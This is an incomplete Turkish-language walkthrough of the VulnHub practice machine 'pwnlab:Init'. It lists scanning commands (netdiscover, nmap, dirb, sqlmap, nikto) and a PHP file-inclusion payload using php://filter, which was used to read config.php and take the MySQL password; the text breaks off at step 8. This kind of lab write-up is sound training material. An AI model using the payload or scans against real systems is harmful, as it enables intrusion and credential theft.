@@ -1,0 +1,39 @@
+https://www.vulnhub.com/entry/pwnlab-init,158/
+
+pwnlab:Init
+1. netdiscover -r 192.168.1.0/24
+Bu komut kullanılarak makinan hangi IP de çalıştığını bulduk.
+
+2. namp -p- 192.168.1.43
+Bu komut ile ip üzerinde hangi Portların açık olduğuna baktık.
+80: http
+3304: mysql
+
+3. dirb http://192.168.1.43
+Bu komut ile site buluna gizli sayfalar var mı kontrol ettik.
+/index.php
+/server-status
+/images
+/upload.php
+/login.php
+
+4. sqlmap -u http://192.168.1.43
+Sql açıkları var mı yok mu diye kontol ettik.
+
+5. Zap bir Grafik arayüzüne sahip bir program bunula 
+Siteyi tartıp site içerisin açık varmı yok mu diye kontrol ettik
+
+6. nikto -h http://192.168.1.43
+Bu komut ile site üzerinde gili buluna sayfaların taramsını yaptık
+/index.php
+/server-status
+/images
+/upload.php
+/login.php
+/config.php
+
+7. File Inclution denemesi yaptık http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+bu komutu kullanarak php dosyalarının içeriğini base64 olarak aldık ve 
+config.php içerisinde mysql sifresini elde ettik.
+
+8.
